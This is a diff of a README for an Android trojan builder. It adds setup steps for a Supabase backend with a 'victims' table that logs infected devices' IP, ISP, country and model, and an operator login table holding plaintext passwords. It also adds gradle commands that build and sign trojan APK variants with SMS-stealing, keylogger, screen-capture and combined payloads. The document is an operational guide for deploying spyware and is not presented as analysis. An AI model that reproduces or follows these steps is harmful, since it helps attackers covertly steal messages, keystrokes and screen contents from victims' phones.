@@ -92,37 +92,111 @@ Generate custom trojans with **three preset profiles**:
 ### 1. Clone Repository
 
 ```bash
-git clone https://github.com/yourusername/Android-Trojan-2.0.git
-cd Android-Trojan-2.0
+git clone https://github.com/Android-App-Security/Android-Trojan-2.0-Modified.git
+cd Android-Trojan-2.0-Modified
 ```
 
-### 2. Install Dependencies
+### 2. Setup Supabase Database
+
+This project uses Supabase for authentication and device tracking.
+
+#### Create Supabase Account
+
+1. Go to [Supabase](https://supabase.com/)
+2. Create a new account (free tier is sufficient)
+3. Create a new project
+
+#### Get Supabase Credentials
+
+1. In your Supabase project dashboard, go to **Settings** → **API**
+2. Copy your **Project URL** (looks like: `https://xxxxx.supabase.co`)
+3. Copy your **anon/public** API key
+
+#### Create Database Tables
+
+1. In Supabase, go to **SQL Editor**
+2. Run the following SQL commands:
+
+```sql
+-- Victims Table (stores connected device information)
+CREATE TABLE public.victims (
+  "ID" character varying NOT NULL,
+  "Country" character varying NULL,
+  "ISP" character varying NULL,
+  "IP" character varying NULL,
+  "Brand" character varying NULL,
+  "Model" character varying NULL,
+  "Manufacture" character varying NULL,
+  CONSTRAINT victims_pkey PRIMARY KEY ("ID")
+) TABLESPACE pg_default;
+
+-- Active User Table (stores login credentials)
+CREATE TABLE public.activeuser (
+  id BIGSERIAL PRIMARY KEY,
+  username character varying NULL,
+  password character varying NULL,
+  name character varying NULL
+) TABLESPACE pg_default;
+```
+
+#### Add Login Credentials
+
+1. In Supabase, go to **Table Editor**
+2. Select the `activeuser` table
+3. Click **Insert** → **Insert row**
+4. Add your credentials:
+   - **username**: `admin` (or your preferred username)
+   - **password**: `password123` (or your preferred password)
+   - **name**: `Administrator` (or your name)
+5. Click **Save**
+
+> **Note:** Passwords are stored in plain text for simplicity. For production use, implement proper password hashing.
+
+### 3. Configure Environment
+
+Create a `.env` file in the project root:
+
+```env
+# Supabase Configuration
+SUPERBASE_URL=https://your-project.supabase.co
+SUPERBASE_KEY=your-anon-public-key-here
+
+# Server Ports
+PORT=4001
+BOT_PORT=4000
+```
+
+Replace `your-project.supabase.co` and `your-anon-public-key-here` with your actual Supabase credentials.
+
+### 4. Install Dependencies
 
 ```bash
 npm install
 ```
 
-### 3. Configure Environment
+### 5. Build APK Variants
 
-Create a `.env` file:
+You can either use pre-built APKs or build them yourself:
 
-```env
-PORT=4001
-BOT_PORT=4000
-```
-
-### 4. Build APK Variants (Optional)
-
-If you want to rebuild the APKs:
+#### Option A: Build APKs (Recommended)
 
 ```bash
 cd mobile
-./gradlew assembleSmsRelease assembleKeyloggerRelease assembleScreenRelease
+./gradlew assembleSmsRelease assembleKeyloggerRelease assembleScreenRelease assembleSmsKeyloggerRelease assembleSmsScreenRelease assembleKeyloggerScreenRelease assembleFullRelease
 cd ..
 ./sign-apks.sh
 ```
 
-Pre-built signed APKs are available in the `output/` directory.
+This will create signed APKs in the `output/` directory.
+
+#### Option B: Use Build Script
+
+```bash
+./build-all-apks.sh
+./sign-apks.sh
+```
+
+> **Note:** Building APKs requires Android SDK and Gradle to be installed.
 
 ---
 
